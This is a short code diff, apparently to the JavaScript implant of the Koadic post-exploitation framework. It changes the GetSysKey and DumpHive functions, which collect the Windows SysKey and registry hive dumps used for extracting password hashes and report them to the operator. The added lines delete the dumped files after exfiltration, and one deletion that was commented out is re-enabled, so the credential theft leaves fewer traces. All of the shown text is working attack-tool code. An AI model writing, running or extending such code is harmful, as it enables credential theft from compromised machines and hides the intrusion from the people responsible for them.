@@ -22,6 +22,10 @@ function GetSysKey()
     headers["Task"] = "SysKey";
 
     Koadic.work.report(data, headers);
+    Koadic.file.deleteFile(jdpath)
+    Koadic.file.deleteFile(skew1path)
+    Koadic.file.deleteFile(gbgpath)
+    Koadic.file.deleteFile(datapath)
 }
 
 function DumpHive(name, uuid)
@@ -40,7 +44,7 @@ function DumpHive(name, uuid)
 
     Koadic.work.report(data, headers);
 
-    //Koadic.file.deleteFile(path);
+    Koadic.file.deleteFile(path);
 }
 
 try
